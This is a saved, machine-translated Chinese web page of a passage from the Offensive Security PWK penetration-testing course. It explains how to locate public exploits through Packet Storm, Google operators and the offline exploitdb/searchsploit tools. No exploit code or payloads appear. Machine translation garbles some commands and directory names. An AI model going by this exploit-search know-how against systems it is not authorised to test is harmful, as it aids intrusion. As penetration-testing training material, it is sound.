
<!-- saved from url=(0051)https://translate.googleusercontent.com/translate_f -->
<html lang="zh-CN" class="translated-ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="google" content="notranslate">
<script>(function(){/*

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/
(function(){function e(g){this.t={};this.tick=function(h,k,f){this.t[h]=[void 0!=f?f:(new Date).getTime(),k];if(void 0==f)try{window.console.timeStamp("CSI/"+h)}catch(m){}};this.getStartTickTime=function(){return this.t.start[0]};this.tick("start",null,g)}var a;if(window.performance)var d=(a=window.performance.timing)&&a.responseStart;var l=0<d?new e(d):new e;window.jstiming={Timer:e,load:l};if(a){var b=a.navigationStart;0<b&&d>=b&&(window.jstiming.srt=d-b)}if(a){var c=window.jstiming.load;0<b&&d>=
b&&(c.tick("_wtsrt",void 0,b),c.tick("wtsrt_","_wtsrt",d),c.tick("tbsd_","wtsrt_"))}try{a=null,window.chrome&&window.chrome.csi&&(a=Math.floor(window.chrome.csi().pageT),c&&0<b&&(c.tick("_tbnd",void 0,window.chrome.csi().startE),c.tick("tbnd_","_tbnd",b))),null==a&&window.gtbExternal&&(a=window.gtbExternal.pageT()),null==a&&window.external&&(a=window.external.pageT,c&&0<b&&(c.tick("_tbnd",void 0,window.external.startE),c.tick("tbnd_","_tbnd",b))),a&&(window.jstiming.pt=a)}catch(g){}})();}).call(window);
</script><script src="./o3cp[442-617]_files/translate_c.js.下载"></script><script>_intlStrings._originalText = "英语原文:";_intlStrings._interfaceDirection="ltr";_intlStrings._interfaceAlign="left";_intlStrings._langpair="en|zh-CN";_intlStrings._feedbackUrl="https://translate.google.com/translate_suggestion";_intlStrings._currentBy="当前的翻译是由%2$s在 %1$s完成的";_intlStrings._unknown="佚名译者";_intlStrings._suggestTranslation="更好的翻译建议"  ;_intlStrings._submit="贡献力量";_intlStrings._suggestThanks="感谢您为 Google 翻译提供翻译建议。";_intlStrings._reverse=false;_intlStrings._staticContentPath="https://www.gstatic.com/translate/infowindow/";</script><style type="text/css">.google-src-text {display: none !important} .google-src-active-text {display: block!important;color:black!important; font-size:12px!important;font-family:arial,sans-serif!important}.google-src-active-text a {font-size:12px!important}.google-src-active-text a:link {color:#00c!important;text-decoration:underline!important}.google-src-active-text a:visited {color:purple!important;text-decoration:underline!important}.google-src-active-text a:active {color:red!important;text-decoration:underline!important}</style><meta http-equiv="X-Translated-By" content="Google"><link href="https://translate.googleusercontent.com/o3cp[442-617].pdf" hreflang="en" rel="alternate machine-translated-from"><link href="./o3cp[442-617]_files/css" rel="stylesheet" type="text/css"><!--<base href="" target="_top">--><base href="." target="_top">

<title>14.2.1.3 数据包风暴 14.2.1.4 谷歌搜索运营商</title>
<style type="text/css" abt="234"></style><link type="text/css" rel="stylesheet" charset="UTF-8" href="./o3cp[442-617]_files/translateelement.css"><script type="text/javascript" charset="UTF-8" src="./o3cp[442-617]_files/main_zh-CN.js.下载"></script><script>//console.log('a')
</script><script>//remove baidu search ad
var _countAA = 0
function doBBBd(){}
doBBBd()
document.addEventListener('keyup', function(){_countAA-=10;doBBBd()}, false)
document.addEventListener('click', function(){_countAA-=10;doBBBd()}, false)

</script><script type="text/javascript" charset="UTF-8" src="./o3cp[442-617]_files/element_main.js.下载"></script><link rel="stylesheet" type="text/css" href="./o3cp[442-617]_files/iw_sprite.css"></head><body bgcolor="#ffffff" vlink="blue" link="blue">
        <style>
          .spinner-container {
            width:25%;
            top:20px;
            left:50%;
            margin-left:-12.5%;
            border-radius:8px;
            position:fixed;
            text-align:center;
            box-shadow:0 0 10px rgba(0,0,0,0.24);
            background:#fff;
            overflow:hidden;
          }

          .spinner-container p{
            font-family:'Roboto', Arial, sans-serif;
            color:rgba(0,0,0,0.87);
            margin:12px 0 16px 0;
            padding:0;
            font-size:12px;
          }

          .spinner-container img{
            width:22px;
            height:22px;
            margin:16px 0 0;
            padding:0;
          }
        </style>
        <div class="spinner-container notranslate" id="gt-dt-spinner" style="display: none;">
         <img src="./o3cp[442-617]_files/progress_spinner_color_20dp@2x.gif">
         <p>正在翻译...</p>
        </div>
      <iframe src="./o3cp[442-617]_files/translate_un.html" width="0" height="0" frameborder="0" style="width:0px;height:0px;border:0px;display:none;"></iframe>
<table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="1"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 1 页</font></font></b></a></font></td></tr></tbody></table><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:208;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:1285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:1285;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:1285;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">442</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.2.1.2.1</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:320;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.2.1.3 包风暴</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:355;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Packet Storm </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">370</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成立于 1998 年。它提供有关安全新闻和</font></font></nobr></div>
<div style="position:absolute;top:374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞以及安全供应商最近发布的工具。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:956;left:354"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 257：数据包风暴主页</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与前面提到的在线资源一样，PacketStorm 将更新发布到 Twitter </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">371</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:1006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还托管一个 RSS 提要。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">372</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:1040;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.2.1.4 谷歌搜索运营商</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1075;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了我们上面介绍的各个网站之外，我们还可以搜索其他漏洞——</font></font></nobr></div>
<div style="position:absolute;top:1094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用传统搜索引擎的托管网站。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:1195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">370 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（数据包风暴，2019 年），https://packetstormsecurity.com</font></font></font></nobr></div>
<div style="position:absolute;top:1215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">371 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（推特，2019 年），https://twitter.com/packet_storm</font></font></font></nobr></div>
<div style="position:absolute;top:1235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">372 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（数据包风暴，2019 年），https://packetstormsecurity.com/feeds</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:1363;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="2"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第2页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:1396;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:2473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:2473;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:2473;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">443</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1492;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以开始搜索特定的软件和版本，然后是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exploit</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关键字和</font></font></nobr></div>
<div style="position:absolute;top:1511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括各种搜索运算符（如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Google</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索引擎</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">373</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用的那些</font><font style="vertical-align: inherit;">）来缩小我们的范围</font></font></nobr></div>
<div style="position:absolute;top:1530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索。</font><font style="vertical-align: inherit;">掌握这些高级运算符可以帮助我们定制搜索结果以准确查找</font></font></nobr></div>
<div style="position:absolute;top:1550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们正在寻找什么。</font></font></nobr></div>
<div style="position:absolute;top:1583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们可以使用以下搜索查询来定位影响</font></font></nobr></div>
<div style="position:absolute;top:1602;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Edge 浏览器并将结果限制为仅托管在 Exploit 上的那些漏洞</font></font></nobr></div>
<div style="position:absolute;top:1621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据库网站：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:1656;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">firefox --search "Microsoft Edge site:exploit-db.com"</font></font></font></b></nobr></div>
<div style="position:absolute;top:1676;left:223"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 405 - 使用 Google 在exploit-db.com 上搜索Microsoft Edge 漏洞</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1705;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用于微调搜索的其他一些搜索运算符包括“inurl”、“intext”和</font></font></nobr></div>
<div style="position:absolute;top:1724;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“标题”。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:1786;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用来自非策划资源的漏洞利用时要格外小心！</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:1848;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.2.2</font></font></i></nobr></div>
<div style="position:absolute;top:1848;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">离线利用资源</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1886;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在渗透测试期间，并不总是保证可以访问 Internet。</font><font style="vertical-align: inherit;">在以下情况下</font></font></nobr></div>
<div style="position:absolute;top:1906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">评估是在一个孤立的环境中进行的，Kali Linux 发行版带有各种</font></font></nobr></div>
<div style="position:absolute;top:1925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供离线访问漏洞利用的工具。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:1960;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.2.2.1 SearchSploit</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:1994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用数据库提供所有托管漏洞利用代码的可下载存档副本。</font></font></nobr></div>
<div style="position:absolute;top:2027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该存档默认包含在 Kali 中的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exploitdb</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包中。</font><font style="vertical-align: inherit;">我们建议您</font></font></nobr></div>
<div style="position:absolute;top:2046;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在任何评估之前更新包，以确保您拥有最新的漏洞利用。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:2066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以使用以下命令更新包：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:2100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt update &amp;&amp; sudo apt installexploitdb</font></font></font></b></nobr></div>
<div style="position:absolute;top:2118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:2151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将升级以下软件包：</font></font></nobr></div>
<div style="position:absolute;top:2168;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用数据库</font></font></nobr></div>
<div style="position:absolute;top:2185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 个升级，1 个新安装，0 个删除，739 个未升级。</font></font></nobr></div>
<div style="position:absolute;top:2202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要获得 23.9 MB/24.0 MB 的档案。</font></font></nobr></div>
<div style="position:absolute;top:2219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此操作后，将使用 2,846 kB 的额外磁盘空间。</font></font></nobr></div>
<div style="position:absolute;top:2236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你要继续吗？</font><font style="vertical-align: inherit;">[Y / N] </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ÿ</font></font></font></b></nobr></div>
<div style="position:absolute;top:2253;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取：1 http://kali.mirror.globo.tech/kali kali-rolling/main amd64exploitdb all 2018022</font></font></nobr></div>
<div style="position:absolute;top:2270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 秒内获取 23.9 MB (8,758 kB/s)    </font></font></nobr></div>
<div style="position:absolute;top:2287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阅读变更日志...完成</font></font></nobr></div>
<div style="position:absolute;top:2304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:2321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置exploitdb (20180220-0kali1) ...</font></font></nobr></div>
<div style="position:absolute;top:2340;left:240"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 406 - 从 Kali Linux 存储库更新exploitdb 包</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:2423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">373 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Ahrefs 私人有限公司，2018 年），https://ahrefs.com/blog/google-advanced-search-operators/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:2551;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="3"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 3 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:2584;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:3661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:3661;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:3661;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">444</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:2680;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上面的命令更新下面的漏洞利用数据库存档的本地副本</font></font></nobr></div>
<div style="position:absolute;top:2699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/exploitdb/. </font><font style="vertical-align: inherit;">这个目录分为两个主要部分，exploits 和 shellcodes：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:2734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -1 /usr/share/exploitdb/</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:2751;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:2768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">files_exploits.csv</font></font></nobr></div>
<div style="position:absolute;top:2785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">files_shellcodes.csv</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:2802;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳代码</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:2821;left:253"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 407 - 列出存档主目录中的两个主要部分</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:2850;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用目录针对每个操作系统进一步划分为单独的目录，</font></font></nobr></div>
<div style="position:absolute;top:2870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">架构和脚本语言：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:2905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -1 /usr/share/exploitdb/exploits/</font></font></font></b></nobr></div>
<div style="position:absolute;top:2922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">艾克斯</font></font></nobr></div>
<div style="position:absolute;top:2939;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安卓</font></font></nobr></div>
<div style="position:absolute;top:2956;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手臂</font></font></nobr></div>
<div style="position:absolute;top:2973;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">灰烬</font></font></nobr></div>
<div style="position:absolute;top:2989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ASP</font></font></nobr></div>
<div style="position:absolute;top:3007;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aspx</font></font></nobr></div>
<div style="position:absolute;top:3024;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">雅典卫士</font></font></nobr></div>
<div style="position:absolute;top:3041;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">贝欧斯</font></font></nobr></div>
<div style="position:absolute;top:3058;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bsd</font></font></nobr></div>
<div style="position:absolute;top:3074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bsd_x86</font></font></nobr></div>
<div style="position:absolute;top:3091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cfm</font></font></nobr></div>
<div style="position:absolute;top:3108;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">计算机图形学</font></font></nobr></div>
<div style="position:absolute;top:3126;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">freebsd</font></font></nobr></div>
<div style="position:absolute;top:3142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">freebsd_x86</font></font></nobr></div>
<div style="position:absolute;top:3159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:3179;left:300"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 408 - 列出漏洞利用目录的内容</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:3208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手动搜索漏洞利用数据库绝不是理想的，特别是考虑到大量</font></font></nobr></div>
<div style="position:absolute;top:3227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">档案中的漏洞利用。</font><font style="vertical-align: inherit;">这就是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实用程序派上用场的地方。</font></font></nobr></div>
<div style="position:absolute;top:3260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以</font><font style="vertical-align: inherit;">不带任何参数从命令行</font><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来显示它的用法：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:3295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit</font></font></font></b></nobr></div>
<div style="position:absolute;top:3312;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法：searchsploit [options] term1 [term2] ... [termN]</font></font></nobr></div>
<div style="position:absolute;top:3332;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 409 - searchsploit 命令语法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:3361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如内置示例所揭示的，searchsploit 允许我们搜索整个档案并</font></font></nobr></div>
<div style="position:absolute;top:3380;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据作为参数提供的各种搜索词显示结果：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:3415;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==========</font></font></nobr></div>
<div style="position:absolute;top:3432;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例子 </font></font></nobr></div>
<div style="position:absolute;top:3449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==========</font></font></nobr></div>
<div style="position:absolute;top:3466;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit afd windows 本地</font></font></nobr></div>
<div style="position:absolute;top:3483;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit -t oracle windows</font></font></nobr></div>
<div style="position:absolute;top:3500;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit -p 39446</font></font></nobr></div>
<div style="position:absolute;top:3517;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit linux 内核 3.2 --exclude="(PoC)|/dos/"</font></font></nobr></div>
<div style="position:absolute;top:3551;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更多示例请参见手册：https://www.exploit-db.com/searchsploit/</font></font></nobr></div>
<div style="position:absolute;top:3570;left:326"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 410 - Searchsploit 命令示例 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:3739;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="4"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 4 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:3772;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:4849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:4849;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:4849;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">445</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:3868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些选项允许我们缩小搜索范围、更改输出格式、更新数据库以及</font></font></nobr></div>
<div style="position:absolute;top:3887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更多的：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:3922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==========</font></font></nobr></div>
<div style="position:absolute;top:3939;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项 </font></font></nobr></div>
<div style="position:absolute;top:3956;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==========</font></font></nobr></div>
